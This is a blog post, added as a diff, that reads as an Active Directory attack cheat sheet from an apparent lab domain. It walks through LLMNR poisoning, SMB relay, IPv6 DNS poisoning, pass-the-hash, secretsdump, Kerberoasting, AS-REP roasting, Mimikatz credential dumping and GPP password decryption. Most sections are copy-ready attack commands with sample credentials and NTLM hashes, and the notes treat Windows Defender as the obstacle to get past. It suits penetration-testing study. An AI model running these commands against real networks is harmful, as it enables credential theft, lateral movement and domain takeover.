@@ -1,0 +1,280 @@
+<br />
+
+<h2>Attacking Active Directory</h2>
+
+
+
+<h2>1. LLMNR Poisoning</h2>
+
+<pre>
+responder -I eth0
+responder -I eth0 -rdw -v (old verison)
+apt install responder (to debug if issues)
+</pre>
+
+<p>Run responder when you first get on the network. Keep it on the entire time.</p>
+
+<p>What is LLMNR? (Link Local Mulitcase Name Resolution)</p>
+<ol>
+  <li>Used to identify hosts when DNS fails to do so.</li>
+  <li>Previously NBT-NS.</li>
+  <li>Key flaw is that the service utilizes a users username and NTLMv2 hash when responded to.</li>
+</ol>
+
+<p><b>How Attack Works:</b> User requests a non-existing share called \\documents. DNS doesn't know what that is. The victim computer uses LLMNR to ask others within the domain if they know. Our attack computer says "YES we know!". The victim computer hands over their username and NTLM to us.</p>
+
+
+<div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi5zKvW3qmQ46bAnvUVQyJcfzvV9wPqncNbdA_d4ldubKHdWwsydg5dpn-wCoRzP9WQRdjmEe0_qyDtILJ3JpfJklpHWAb9p1y3RfAmN-TZJBQs4MOskbQCuD3ua6vlTUK1sGYTigmDVjH261AjdH4iyvDoNV1oK-VBRDAlMdLOUX8H9iyhf-f1A6IS/s1600/LLMNRPoisoning.png" style="display: block; padding: 1em 0; text-align: center; "><img alt="" border="0" data-original-height="389" data-original-width="1578" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi5zKvW3qmQ46bAnvUVQyJcfzvV9wPqncNbdA_d4ldubKHdWwsydg5dpn-wCoRzP9WQRdjmEe0_qyDtILJ3JpfJklpHWAb9p1y3RfAmN-TZJBQs4MOskbQCuD3ua6vlTUK1sGYTigmDVjH261AjdH4iyvDoNV1oK-VBRDAlMdLOUX8H9iyhf-f1A6IS/s1600/LLMNRPoisoning.png"/></a></div>
+
+Victim computer hands over a NTLMv2 Hash.
+
+<div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiEo7fzfbJYP-yPWGK8R_60VQkjFI06pgVmg-rKcAfn4fVECvFM88xeiPNVvecAq5tiAxck3APBh46eZiPJjW0HutGwKu2p6xf-pMi-L0nyvePCzOxZzxB_BGOo_3vWFZRqO_FUAP_xA5_HpVLpM82z7raKK9KvaJkZf58UohncwBJe471EYpmZpiqZ/s1600/HashCat.png" style="display: block; padding: 1em 0; text-align: center; "><img alt="" border="0" data-original-height="872" data-original-width="1574" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiEo7fzfbJYP-yPWGK8R_60VQkjFI06pgVmg-rKcAfn4fVECvFM88xeiPNVvecAq5tiAxck3APBh46eZiPJjW0HutGwKu2p6xf-pMi-L0nyvePCzOxZzxB_BGOo_3vWFZRqO_FUAP_xA5_HpVLpM82z7raKK9KvaJkZf58UohncwBJe471EYpmZpiqZ/s1600/HashCat.png"/></a></div>
+
+Take that string and put it in a hash.txt file. Then crack the password via hashcat.
+
+<pre>hashcat -m 5600 pparker.txt /usr/share/wordlists/rockyou.txt</pre>
+
+<p>Video: <a target="_blank" href="https://www.youtube.com/watch?v=6jvGK5jld-I">https://www.youtube.com/watch?v=6jvGK5jld-I</a></p>
+
+<h2>2. SMB Relay Attack</h2>
+
+
+<p>What is SMB Relay?<br />
+- Instead of cracking hashes gathered with Responder, we can instead relay those hashes to specific machines and gain access.</p>
+
+<p>
+Requirements<br />
+<ol>
+  <li>SMB signing must be disabled on the target machine.</li>
+  <li>Relayed user creds must be admin on the machine.</li>
+</ol>
+
+<pre>
+sudo nmap 192.168.200.* -p 445 --script smb2-security-mode
+vim /usr/share/responder/Responder.conf
+1. Go into Responder.conf. Turn off HTTP and SMB.
+sudo responder -I eth0 -v
+sudo impacket-ntlmrelayx -tf targets.txt -smb2support - OR -
+sudo impacket-ntlmrelayx -tf targets.txt -smb2support -i (interactive shell)
+2. Run responder and impacket-ntlmrelayx at the same time.
+3. Put "Signing Enabled but not Required" computers into targets.txt.
+</pre>
+
+<div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhCf4CAjDvRUTYcbfXp-Vg7NX3IcPF4vzpXSj6bGe0PEcefSCiH35v4g8AmyMovk-4jNo2z7WEMQt-WRl-0qsLDMA9lth3Cg3rYYcm8ELvxQYLzDiGptVIgmYDRl6IEJ7XBA_RiNOTifKBUq4nCjSbbT-0JWfgxKobPLWpHqG3Ul-qXZf2blNXYCkGm/s1600/SMBRelayNotes1.png" style="display: block; padding: 1em 0; text-align: center; "><img alt="" border="0" data-original-height="844" data-original-width="852" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhCf4CAjDvRUTYcbfXp-Vg7NX3IcPF4vzpXSj6bGe0PEcefSCiH35v4g8AmyMovk-4jNo2z7WEMQt-WRl-0qsLDMA9lth3Cg3rYYcm8ELvxQYLzDiGptVIgmYDRl6IEJ7XBA_RiNOTifKBUq4nCjSbbT-0JWfgxKobPLWpHqG3Ul-qXZf2blNXYCkGm/s1600/SMBRelayNotes1.png"/></a></div>
+
+<div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgc9ULb94T_J9WGia7As_l1EwL1gqnWfGCujOpvpstZYBKO3ToPu7S_P7aUh5DVG9w982VapbAZQaYN5Kv4eKMNn8XKNsiSZIga3M3fXDi3ykEK6W9HWH7ZQIoPl0GX6ZwpJcH_6p4A2OY6YNr5iiB7y5G4kB6NNUuFH-dZlbSmyEx8o69SAGV7k6D_/s1600/SMB-Relay1.png" style="display: block; padding: 1em 0; text-align: center; "><img alt="" border="0" data-original-height="699" data-original-width="1186" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgc9ULb94T_J9WGia7As_l1EwL1gqnWfGCujOpvpstZYBKO3ToPu7S_P7aUh5DVG9w982VapbAZQaYN5Kv4eKMNn8XKNsiSZIga3M3fXDi3ykEK6W9HWH7ZQIoPl0GX6ZwpJcH_6p4A2OY6YNr5iiB7y5G4kB6NNUuFH-dZlbSmyEx8o69SAGV7k6D_/s1600/SMB-Relay1.png"/></a></div>
+
+<p>
+
+  
+<h2>3. IPv6 DNS Poisoning Attack</h2>
+
+<p>When a computer restarts (or every 30 minutes), IPv6 will request the DNS. By default, no DNS is specified for IPv6. Our attack computer says "I AM THE DNS!!".
+  
+<p>Run both commands at the same time.</p>
+<pre>
+sudo python3 mitm6.py -d vulcan.local
+sudo impacket-ntlmrelayx -6 -t ldaps://192.168.200.191 -wh fakewpadd.vulcan.local -l lootme3
+-- After Exploit -- 
+sudo impacket-secretsdump -dc-ip 192.168.200.191 'VULCAN.local/wQcIvVulBe:IHXIVi48Q6)*+$#'@192.168.200.191
+sudo impacket-secretsdump -dc-ip 192.168.200.191 -hashes aad3b435b51404eeaad3b435b51404ee:8119935c5f7fa5f57135620c8073aaca 'VULCAN.local/Administrator'@192.168.200.191 -just-dc
+</pre>
+
+<div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhGLfIDVi9UkYgllUOtShgsIvJUzszMIBrpAZAGlemZ2-SsCUzC8szPmhgDE-P-EDfBHOrD62gOwDk9MSlzEAOcCJ6grISixv8TtJmkSjH-JDKP6LMyPG2kqRVzu6rb1_UiK_Gwe7znZ1AIK-zdyNw_Paf6oWSW8FsJaRerbE5ulIjOdW_U5O1DqIID/s1600/FixMitm6.png" style="display: block; padding: 1em 0; text-align: center; "><img alt="" border="0" data-original-height="403" data-original-width="1124" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhGLfIDVi9UkYgllUOtShgsIvJUzszMIBrpAZAGlemZ2-SsCUzC8szPmhgDE-P-EDfBHOrD62gOwDk9MSlzEAOcCJ6grISixv8TtJmkSjH-JDKP6LMyPG2kqRVzu6rb1_UiK_Gwe7znZ1AIK-zdyNw_Paf6oWSW8FsJaRerbE5ulIjOdW_U5O1DqIID/s1600/FixMitm6.png"/></a></div>
+
+<p style="color: red">If using tun0, fix the mitm6.py code. <a href="https://github.com/dirkjanm/mitm6/issues/16">https://github.com/dirkjanm/mitm6/issues/16</a> Easy to install. Put in /opt folder pip3 install -r requirements. Should be good to go. </p>
+
+<div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhypeWZv-byzlywz6tNAYOcl9yNNtRDOVbf-rCDXGZn_O1Kz2g4r-1dRsxlhQiCvL2qpoiedlw6IeXgqM4sBXL6uw_ImhVU--CzYQwPe7HKdInKz0i5Yvm2e3oXyrCfRxPlEQXZFbQ15PDGynSWnAJ3S2AcMiy-6qh5v7Vu73uvBRMVpWaI52tg-dT7/s1600/miTM-Step4.png" style="display: block; padding: 1em 0; text-align: center; "><img alt="" border="0" data-original-height="1072" data-original-width="1129" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhypeWZv-byzlywz6tNAYOcl9yNNtRDOVbf-rCDXGZn_O1Kz2g4r-1dRsxlhQiCvL2qpoiedlw6IeXgqM4sBXL6uw_ImhVU--CzYQwPe7HKdInKz0i5Yvm2e3oXyrCfRxPlEQXZFbQ15PDGynSWnAJ3S2AcMiy-6qh5v7Vu73uvBRMVpWaI52tg-dT7/s1600/miTM-Step4.png"/></a></div>
+
+<div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjvj9nVy168qX0_ohv8OM88vPenM4fVlxPUIoNTy8mHSKcCNSWVKFTx6BXes2Sb2ADN2Aapa_O6UcKTLBPJsk_NYjXDdVL3KRAcc1zEaNFSeSikT8dbLnW_RMKTtCu7yhs44mdGQFkfV7mRu4i0SpmfFioDugITcsS1BvUq-UoaL02LsGwXJmY1s39Q/s1600/MitM-Step6.png" style="display: block; padding: 1em 0; text-align: center; "><img alt="" border="0" data-original-height="208" data-original-width="787" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjvj9nVy168qX0_ohv8OM88vPenM4fVlxPUIoNTy8mHSKcCNSWVKFTx6BXes2Sb2ADN2Aapa_O6UcKTLBPJsk_NYjXDdVL3KRAcc1zEaNFSeSikT8dbLnW_RMKTtCu7yhs44mdGQFkfV7mRu4i0SpmfFioDugITcsS1BvUq-UoaL02LsGwXJmY1s39Q/s1600/MitM-Step6.png"/></a></div>
+
+<div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgcD9z02evP31_-7C1dzEk0jjfGWkQDm-4CeTURwRQhOW2DAG7nrpXyKI7qu3Ati38bgd_0z9tmsQls-VDcU1bZM9AA42XtCygkdKRvCGjEdNF1CBznDpXo79YJpcFNEdrkLnO9Onrc57I2WQX9koZBpUx8HeP0eV8D7TuwWx-5lJTqmZEiqR_b5zez/s1600/Ipv6WhatYouCanDo1.png" style="display: block; padding: 1em 0; text-align: center; "><img alt="" border="0" data-original-height="587" data-original-width="986" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgcD9z02evP31_-7C1dzEk0jjfGWkQDm-4CeTURwRQhOW2DAG7nrpXyKI7qu3Ati38bgd_0z9tmsQls-VDcU1bZM9AA42XtCygkdKRvCGjEdNF1CBznDpXo79YJpcFNEdrkLnO9Onrc57I2WQX9koZBpUx8HeP0eV8D7TuwWx-5lJTqmZEiqR_b5zez/s1600/Ipv6WhatYouCanDo1.png"/></a></div>
+
+<div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh-fmlouPA_VU2EONHfRqdvBM7lHH6Ia-H2haPt7djlc4MV7GKBEqOcDWwRWc3KSdoB_Lp-0A8dhNYx355iyNVx7-2C9lbvl9UF3EkZUc8pha7awfPn-dq5L0xW4qQRDEmGwal3vYv8eX5buWcqFVofupkDUj_Z5NyrW0S2fYaoNiO7I97Si0FD-d7H/s1600/Ipv6WhatYouCanDoWithOnlyAHash.png" style="display: block; padding: 1em 0; text-align: center; "><img alt="" border="0" data-original-height="776" data-original-width="1275" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh-fmlouPA_VU2EONHfRqdvBM7lHH6Ia-H2haPt7djlc4MV7GKBEqOcDWwRWc3KSdoB_Lp-0A8dhNYx355iyNVx7-2C9lbvl9UF3EkZUc8pha7awfPn-dq5L0xW4qQRDEmGwal3vYv8eX5buWcqFVofupkDUj_Z5NyrW0S2fYaoNiO7I97Si0FD-d7H/s1600/Ipv6WhatYouCanDoWithOnlyAHash.png"/></a></div>
+
+<p>Only have a hash? That can work too.</p>
+
+_____
+
+<h2>4. Pass the Password</h2>
+<pre>
+crackmapexec smb 192.168.200.0/24 -u administrator -d VULCAN.local -p password123!
+impacket-psexec 'VULCAN.local/administrator:password123!'@192.168.200.191
+impacket-smbexec 'VULCAN.local/administrator:password123!'@192.168.200.191
+impacket-wmiexec 'VULCAN.local/administrator:password123!'@192.168.200.191
+</pre>
+
+<div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgSmGP_JiAx6_ftnujl4mgQz18J2R6cKhfJXK8T3HGwJtP3h5JUzzQc-hn2Aba7Hzl18yK_8pDqsm_y9MUZgAohFTpewvQqXWLdaYxB25Fwy_pP1F-70aFr5e7qRDnkiPMhw0lDvvnJdEJtFz_F0nhrxsG5Be3KTRA1wMLru084c7cK6Xn7-lUx0wwB/s1600/crackMapExec.png" style="display: block; padding: 1em 0; text-align: center; "><img alt="" border="0" data-original-height="1015" data-original-width="1263" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgSmGP_JiAx6_ftnujl4mgQz18J2R6cKhfJXK8T3HGwJtP3h5JUzzQc-hn2Aba7Hzl18yK_8pDqsm_y9MUZgAohFTpewvQqXWLdaYxB25Fwy_pP1F-70aFr5e7qRDnkiPMhw0lDvvnJdEJtFz_F0nhrxsG5Be3KTRA1wMLru084c7cK6Xn7-lUx0wwB/s1600/crackMapExec.png"/></a></div>
+
+<p>crackmapexec will retry creds on the entire network. If PSExec doesn't work, odds are Windows Defender/Virus Protection is on.</p>
+
+<h2>5. Dump SAM Hashes with SecretsDump</h2>
+
+<pre>
+sudo impacket-secretsdump -dc-ip 192.168.200.191 'VULCAN.local/wQcIvVulBe:IHXIVi48Q6)*+$#'@192.168.200.191
+sudo impacket-secretsdump -dc-ip 192.168.200.191 -hashes aad3b435b51404eeaad3b435b51404ee:8119935c5f7fa5f57135620c8073aaca 'VULCAN.local/Administrator'@192.168.200.191 -just-dc
+</pre>
+
+<p>Screenshots at end of Section 3</p>
+
+<h2>6. Hashcat for NTLM Hashes</h2>
+
+<pre>
+hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt (NTLM Sam Hashes)
+hashcat -m 5600 pparker.txt /usr/share/wordlists/rockyou.txt (NTLMv2)
+</pre>
+
+<div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlqegD2iC8LvJm9pLBx36s3FtchflDBBOQ8vJg3Nvvk9oRrUGa4HesVKBwnOTrtTe5z2kq8tSccWWswqvB7m9ehvxwtBSrpwth4cA0S7d0mMNADJSJ42gN2DCEe138d6CJZ9LK802w_RosKbuk7fFwrfpukiqsoyUpmT24STglwieHAxm0X27MnwSG/s1600/NTLMHashes.png" style="display: block; padding: 1em 0; text-align: center; "><img alt="" border="0" data-original-height="435" data-original-width="1129" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlqegD2iC8LvJm9pLBx36s3FtchflDBBOQ8vJg3Nvvk9oRrUGa4HesVKBwnOTrtTe5z2kq8tSccWWswqvB7m9ehvxwtBSrpwth4cA0S7d0mMNADJSJ42gN2DCEe138d6CJZ9LK802w_RosKbuk7fFwrfpukiqsoyUpmT24STglwieHAxm0X27MnwSG/s1600/NTLMHashes.png"/></a></div>
+
+<div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgAiHJeWAEfb0dP0-106OTetWQpuI-14BBWr5t32LzdBk5fSIpRIxYWGLMN-qTKO2wQ5XZtM9PpPcWEFk8Ro9p0bbsPh4Mt8sEFMlYUKsZ1aBbnNOLcIStccv45PC66iMjPKNUJx4dj7b-ik5M6GHg8TXMwxzogHq_NNfwTr-yEiSw6ZsWWi8_GBoK1/s1600/NTLMv2Hash.png" style="display: block; padding: 1em 0; text-align: center; "><img alt="" border="0" data-original-height="295" data-original-width="1612" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgAiHJeWAEfb0dP0-106OTetWQpuI-14BBWr5t32LzdBk5fSIpRIxYWGLMN-qTKO2wQ5XZtM9PpPcWEFk8Ro9p0bbsPh4Mt8sEFMlYUKsZ1aBbnNOLcIStccv45PC66iMjPKNUJx4dj7b-ik5M6GHg8TXMwxzogHq_NNfwTr-yEiSw6ZsWWi8_GBoK1/s1600/NTLMv2Hash.png"/></a></div>
+
+<h2>7. Pass the Hash</h2>
+<pre>
+crackmapexec smb 192.168.200.0/24 -u "Administrator" -H  aad3b435b51404eeaad3b435b51404ee:8119935c5f7fa5f57135620c8073aaca
+crackmapexec smb 192.168.200.0/24 -u "Administrator" -H  aad3b435b51404eeaad3b435b51404ee:8119935c5f7fa5f57135620c8073aaca --local-auth
+impacket-psexec "VULCAN.local/annieh":@192.168.200.203 -hashes aad3b435b51404eeaad3b435b51404ee:8119935c5f7fa5f57135620c8073aaca
+impacket-psexec "Administrator":@192.168.200.203 -hashes aad3b435b51404eeaad3b435b51404ee:8119935c5f7fa5f57135620c8073aaca
+</pre>
+
+<div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhLG2EW96R4DLGcMZiXsR0q_zYnYWjWJNbmi0tnQxdVOpF9BahwjeqLi-xfq7tE9bkhC815JHiJmavhwMyLwo-nhSyoV9A3eVZF-FzfuX6FPYYelfoZaWFU4reS7j_vnBorJReuQR7K-4v2A7vmKO3jzZG1RSjO9ELf-bL4BPhJ3WWSrpgZvSE9LO7s/s1600/PassTheHashCrackExec.png" style="display: block; padding: 1em 0; text-align: center; "><img alt="" border="0" data-original-height="194" data-original-width="1494" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhLG2EW96R4DLGcMZiXsR0q_zYnYWjWJNbmi0tnQxdVOpF9BahwjeqLi-xfq7tE9bkhC815JHiJmavhwMyLwo-nhSyoV9A3eVZF-FzfuX6FPYYelfoZaWFU4reS7j_vnBorJReuQR7K-4v2A7vmKO3jzZG1RSjO9ELf-bL4BPhJ3WWSrpgZvSE9LO7s/s1600/PassTheHashCrackExec.png"/></a></div>
+
+<div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUzK7cRlTuogO2PWd8eRZzoHcWCNT_ZI77YUkJ5DtWx9Rj67ScEgeFQ_ZfJt9_vvCE3JsF4P2rdbuJLapH-qBj0aArGqxElqiN7bi0vr0k-4x9TUXCTKpMDJrF2DvF4dHM7C2UZPkLCSZFECYvytQ7neXNOGTGUNhrwq9Yvv2Bh4QIHgO2lcX7WNXj/s1600/PSExec.png" style="display: block; padding: 1em 0; text-align: center; "><img alt="" border="0" data-original-height="275" data-original-width="1148" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUzK7cRlTuogO2PWd8eRZzoHcWCNT_ZI77YUkJ5DtWx9Rj67ScEgeFQ_ZfJt9_vvCE3JsF4P2rdbuJLapH-qBj0aArGqxElqiN7bi0vr0k-4x9TUXCTKpMDJrF2DvF4dHM7C2UZPkLCSZFECYvytQ7neXNOGTGUNhrwq9Yvv2Bh4QIHgO2lcX7WNXj/s1600/PSExec.png"/></a></div>
+
+<div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiGL47Z4enpU0j2LSky_uM0sju5ElVWe6XW9SV9KS0MnrOdNuIopvnRmClWBblaVcmBBFlyjewB7QkbC1CI7w_60eYW_XyKNySogKI_4MCYHHkHT850z5XSvewMJ8aHtqF4X_5Y0D0Z6bMgmxcJaVi2g_F_k4ICEz2Iq-p8juIPNisJ-tVxQomtl_M8/s1600/PSExec2.png" style="display: block; padding: 1em 0; text-align: center; "><img alt="" border="0" data-original-height="273" data-original-width="1122" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiGL47Z4enpU0j2LSky_uM0sju5ElVWe6XW9SV9KS0MnrOdNuIopvnRmClWBblaVcmBBFlyjewB7QkbC1CI7w_60eYW_XyKNySogKI_4MCYHHkHT850z5XSvewMJ8aHtqF4X_5Y0D0Z6bMgmxcJaVi2g_F_k4ICEz2Iq-p8juIPNisJ-tVxQomtl_M8/s1600/PSExec2.png"/></a></div>
+
+<h2>8. Token Impersonation</h2>
+
+<pre>
+load incognito (type help for available commands)
+list_tokens -u
+impersonate_token vulcan\\Administrator
+rev2self
+</pre>
+
+<div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgrnH4rcE8Z0i7WUod-q441d6JBIK4VO_OD4AwBwA6XmhWKd8hioyB_kRDij6lAb9f5asxa40hWgVT6nA_rkttXvrc4VdqmJabY-5JgdQ3VrBbVGqWUvhTSE1EnQxI6JHnz9lm-_d6HKvtth_b4GEP15cu6SnZMdiqdkp5DJbGBBx3JURG73FWNUGwo/s1600/TokenImpersonationViaMetasploit.png" style="display: block; padding: 1em 0; text-align: center; "><img alt="" border="0" data-original-height="932" data-original-width="886" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgrnH4rcE8Z0i7WUod-q441d6JBIK4VO_OD4AwBwA6XmhWKd8hioyB_kRDij6lAb9f5asxa40hWgVT6nA_rkttXvrc4VdqmJabY-5JgdQ3VrBbVGqWUvhTSE1EnQxI6JHnz9lm-_d6HKvtth_b4GEP15cu6SnZMdiqdkp5DJbGBBx3JURG73FWNUGwo/s1600/TokenImpersonationViaMetasploit.png"/></a></div>
+
+<p><b>Token Impersonation</b></p>
+<p>Tokens: Temporary keys that allow you access to a system. Cookies for computers.</p>
+
+<p><b>Two types of Tokens:</b></p>
+<p>
+Delegate - Created for logging into a machine or using Remote Desktop.<br />
+Impersonate - "non-interactive" such as attaching a network drive or a domain logon script.
+</p>
+
+<h2>9. Kerberoasting</h2>
+
+<p>Goal: Get a TGS (Ticket Granting Service) from the Domain Controller. We can use the TGS to crack a service password using hashcat. Sometimes, Windows Services are misconfigured as Domain Admin Users. For example, we can get the TGS of SQLService, find the password to be "password123!" and then login to the domain controller.</p>
+
+<pre>
+GetUserSPNs.py vulcan.local/annieh:password123! -dc-ip 192.168.200.215 -request
+hashcat -m 13100 krb5tgs.txt /usr/share/wordlists/rockyou.txt 
+</pre>
+
+<ol>
+  <li>Request Ticket Granting Ticket (TGT), This TGT provides a username and NTLM hash to the DC.</li> 
+  <li>DC sends back a TGT encrypted with a krbtgt hash</li>
+  <li>Request TGS (Ticket Granting Service) for Service needed (Present the TGT you now have)</li>
+  <li>Recieve TGS encrypted with service account hash (TGS recieved).</li>
+  <li>Crack that using hashcat.</li>
+</ol>
+
+<h2>10. AS-REP Kerberoasting</h2>
+
+<div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgVOHfmXQm6GayODwgPZHrEBT6mZMlCeiefUGnbGz07oSbjAT66a8GpNOVqmSthxD8s4RGg-CCZPYvc1Ly-kC1egKcegV_S-LR-jNQQQJWRsMQyuijaKmV98-JAvmltjkCltjOCqgi-XwL2XXws-Y7UaSNJcHhJ2-PyHkxiHNuxmXf-gVAlY7rsw3jy/s1600/JustByAUsernameTGT.png" style="display: block; padding: 1em 0; text-align: center; "><img alt="" border="0" data-original-height="212" data-original-width="1594" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgVOHfmXQm6GayODwgPZHrEBT6mZMlCeiefUGnbGz07oSbjAT66a8GpNOVqmSthxD8s4RGg-CCZPYvc1Ly-kC1egKcegV_S-LR-jNQQQJWRsMQyuijaKmV98-JAvmltjkCltjOCqgi-XwL2XXws-Y7UaSNJcHhJ2-PyHkxiHNuxmXf-gVAlY7rsw3jy/s1600/JustByAUsernameTGT.png"/></a></div>
+
+<pre>
+u = username (roastUsers taken from RPC output)
+awk -F '[][]' '{ print $2 }' users.txt > roastUsers.txt
+for u in $(cat roastUsers.txt); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb.local/$u@10.10.10.161; done
+</pre>
+
+<div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj5ak4xC-_8iO6BFGopaPZ7E82eeonlN5onLyze28ybe8clGfccQ233fiICr9JWoM46PHMbfHApNTYJgBiewInuN_hO8Q6iU36M8olvsT2vGTXTGvL7cmsVNxpEwOBaLnU0Y35kTxDDW26AD_uCfMWOudEcZ4VxXKx95QN7O8bR9JzY3BBrvo4VLZc2/s1600/KerberoastAttack.png" style="display: block; padding: 1em 0; text-align: center; "><img alt="" border="0" data-original-height="607" data-original-width="887" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj5ak4xC-_8iO6BFGopaPZ7E82eeonlN5onLyze28ybe8clGfccQ233fiICr9JWoM46PHMbfHApNTYJgBiewInuN_hO8Q6iU36M8olvsT2vGTXTGvL7cmsVNxpEwOBaLnU0Y35kTxDDW26AD_uCfMWOudEcZ4VxXKx95QN7O8bR9JzY3BBrvo4VLZc2/s1600/KerberoastAttack.png"/></a></div>
+
+
+<h2>11. Mimikatz</h2>
+
+<p>Used to view and steal creds and generate Kerberos tickets. Dump creds stored in memory. Pass-The-Ticket, Golden, Silver Ticket. <a href="https://github.com/ParrotSec/mimikatz">Mimikatz</a></p>
+
+<pre>
+C:\Users\Public\Documents>mimikatz.exe
+mimikatz.exe
+The system cannot execute the specified program.
+</pre>
+
+<p style="color: red; font-weight: bold">Get this error? Windows Defender is on.</p>
+
+<pre>
+privilege::debug
+sekurlsa::logonpasswords (get logged in users)
+lsadump::sam OR lsadump::sam /patch (sometimes doesn't work)
+lsadump::lsa /patch (good 2nd pick)
+</pre>
+
+<div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi3BQfiTO4gm15p5pVCh7huRztq4yacEg31m6JD-msS3ujqhy4CSgpP-u7oops8lLgBF-WKnXAboiyI_35xHnkJIg4krT2Q1AFPA6-JOk8rXmqfAu7_suY2JGZkk5utYFXNIMlp9vQ_HTjC4QYFex8PPGSpPL8qcSrRZahvwcnuXIjleR-SfhDiYWgj/s1600/LSADUMP-LSA-PATCH.png" style="display: block; padding: 1em 0; text-align: center; "><img alt="" border="0" data-original-height="525" data-original-width="985" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi3BQfiTO4gm15p5pVCh7huRztq4yacEg31m6JD-msS3ujqhy4CSgpP-u7oops8lLgBF-WKnXAboiyI_35xHnkJIg4krT2Q1AFPA6-JOk8rXmqfAu7_suY2JGZkk5utYFXNIMlp9vQ_HTjC4QYFex8PPGSpPL8qcSrRZahvwcnuXIjleR-SfhDiYWgj/s1600/LSADUMP-LSA-PATCH.png"/></a></div>
+
+<p>hashcat -m 1000 will work on the NTLM hash. The SHA1 is a stand-alone and can work with hashcat -m 170 sha1.txt /usr/share/wordlists/rockyou.txt too.
+  
+
+<h2>12. GPP Group Policy Preferences MS14-025</h2>
+
+<p>Allowed Admins to create policies using embedded credentials. Creds were encrypted and placed in a <b>cPassword</b> field. The GPP key was accidentally released. We can now decrypt GPP passwords. This only works on servers before the MS14-025 patch. Many Windows Server 2012 and before can be vulnerable.</p>
+
+<p>Once you get username:password, try kerberoasting or secretsdump if login is not working.</p>
+
+<pre>
+msf> auxiliary/scanner/smb/smb_enum_gpp
+msf> post/windows/gather/credentials/gpp
+</pre>
+
+<div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiqy6vyex5m9g1xHjvdCmtXJThLm27QhKfcUAWKM3_SDIQmFYhlnZutuj2WSL6tbIxIjDiaq4UDccephnRsyxwKY5mrMvHoYAYrGrUpsUn0UMXcXi98PLIJPyYG-ZjPIKBq_fDy9rZuJr0heiyE0n5mGE7mPGpg7kU55ZTjMDvTr3xBE17PaM2yiHEL/s1600/BlogGPPExample.png" style="display: block; padding: 1em 0; text-align: center; "><img alt="" border="0" data-original-height="248" data-original-width="1359" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiqy6vyex5m9g1xHjvdCmtXJThLm27QhKfcUAWKM3_SDIQmFYhlnZutuj2WSL6tbIxIjDiaq4UDccephnRsyxwKY5mrMvHoYAYrGrUpsUn0UMXcXi98PLIJPyYG-ZjPIKBq_fDy9rZuJr0heiyE0n5mGE7mPGpg7kU55ZTjMDvTr3xBE17PaM2yiHEL/s1600/BlogGPPExample.png"/></a></div>
+
